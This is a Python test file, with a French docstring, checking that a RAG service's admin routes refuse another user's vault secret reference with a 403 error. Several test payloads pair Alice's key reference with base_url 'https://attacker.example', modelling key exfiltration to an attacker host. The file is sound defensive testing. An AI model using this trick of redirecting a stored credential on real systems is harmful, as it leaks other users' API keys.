"""Verrou des refs de secrets sur les routes qui écrivent une config de service.

Scénario d'attaque : un workspace créé depuis l'endpoint partagé d'Alice
garde la ref `${vault://alice-vault:…}`. Changer seulement le `base_url` (ou
saisir cette ref à la main) ferait envoyer la clé d'Alice vers un serveur
choisi par l'appelant — refusé (403 `foreign_vault_ref`)."""

from __future__ import annotations

import asyncio
from typing import Any

import asyncpg
from fastapi.testclient import TestClient

from rag.auth.owner import principal_to_owner_id

_ALICE_REF = "${vault://alice-vault:/providers/openai}"


def _run(dsn: str, sql: str, *args: Any) -> Any:
    async def go() -> Any:
        conn = await asyncpg.connect(dsn)
        try:
            return await conn.fetchval(sql, *args)
        finally:
            await conn.close()

    return asyncio.run(go())


def _ws_from_alice_shared_endpoint(
    client: TestClient, headers: dict[str, str], dsn: str, name: str
) -> None:
    vault_id = _run(
        dsn,
        "INSERT INTO harpocrate_vaults "
        "(id, name, label, base_url, api_key_id, api_key_encrypted, is_default, owner_id) "
        "VALUES (gen_random_uuid(), 'alice-vault', 'alice', 'https://harpo', 'ka', "
        "pgp_sym_encrypt('s', 'passphrase-of-at-least-32-characters-long'), false, $1) "
        "RETURNING id",
        principal_to_owner_id("alice@example.com"),
    )
    endpoint_id = _run(
        dsn,
        "INSERT INTO vault_endpoints (vault_id, label, slug, indexer_provider, indexer_model, "
        "indexer_api_key_ref, shared_with_all) "
        "VALUES ($1, 'alice', 'alice-ep', 'openai', 'text-embedding-3-small', $2, true) "
        "RETURNING id",
        vault_id,
        _ALICE_REF,
    )
    r = client.post(
        "/api/admin/workspaces",
        headers=headers,
        json={"name": name, "label": name, "endpoint_id": str(endpoint_id)},
    )
    assert r.status_code == 201, r.text


def test_reindex_changing_base_url_while_keeping_foreign_ref_is_refused(
    admin_client: TestClient,
    admin_headers: dict[str, str],
    pg_container: str,
    cleanup_ws_dbs_api: None,
) -> None:
    _ws_from_alice_shared_endpoint(admin_client, admin_headers, pg_container, "guard-reindex")
    r = admin_client.post(
        "/api/admin/workspaces/guard-reindex/reindex",
        headers=admin_headers,
        json={
            "indexer": {
                "provider": "openai",
                "model": "text-embedding-3-small",
                "base_url": "https://attacker.example",
            }
        },
    )
    assert r.status_code == 403
    assert r.json()["detail"] == {"error": "foreign_vault_ref", "vault": "alice-vault"}


def test_foreign_ref_typed_by_hand_is_refused_on_patch_rerank_and_llm(
    admin_client: TestClient,
    admin_headers: dict[str, str],
    pg_container: str,
    cleanup_ws_dbs_api: None,
) -> None:
    _ws_from_alice_shared_endpoint(admin_client, admin_headers, pg_container, "guard-hand")
    base = "/api/admin/workspaces/guard-hand"

    patch = admin_client.patch(
        base, headers=admin_headers, json={"indexer": {"api_key_ref": _ALICE_REF}}
    )
    rerank = admin_client.put(
        f"{base}/rerank",
        headers=admin_headers,
        json={
            "provider": "cohere",
            "model": "rerank-v3.5",
            "api_key_ref": _ALICE_REF,
            "base_url": "https://attacker.example",
        },
    )
    llm = admin_client.post(
        f"{base}/llm-configs",
        headers=admin_headers,
        json={
            "provider": "openai",
            "model": "gpt-x",
            "api_key_ref": _ALICE_REF,
            "base_url": "https://attacker.example",
        },
    )

    for resp in (patch, rerank, llm):
        assert resp.status_code == 403, resp.text
        assert resp.json()["detail"]["error"] == "foreign_vault_ref"


def test_own_default_vault_ref_is_still_accepted(
    admin_client: TestClient, admin_headers: dict[str, str], cleanup_ws_dbs_api: None
) -> None:
    """Non-régression : le coffre par défaut (modifiable par tout admin) passe."""
    r = admin_client.post(
        "/api/admin/workspaces",
        headers=admin_headers,
        json={"name": "guard-ok", "label": "ok", "endpoint_id": admin_client.default_endpoint_id},  # type: ignore[attr-defined]
    )
    assert r.status_code == 201, r.text
    rerank = admin_client.put(
        "/api/admin/workspaces/guard-ok/rerank",
        headers=admin_headers,
        json={"provider": "cohere", "model": "rerank-v3.5", "api_key_ref": "${vault://rag:k}"},
    )
    assert rerank.status_code == 200, rerank.text
